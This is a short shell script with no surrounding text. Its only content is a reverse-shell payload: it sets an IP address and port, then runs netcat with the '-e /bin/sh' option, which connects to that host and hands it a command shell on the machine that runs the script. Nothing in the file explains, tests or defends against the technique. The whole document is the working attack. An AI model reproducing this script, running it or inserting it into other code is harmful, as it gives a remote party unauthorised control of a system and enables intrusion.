#!/bin/sh
IP="10.60.99.29"
PORT="4456"
/usr/bin/nc $IP $PORT -e /bin/sh
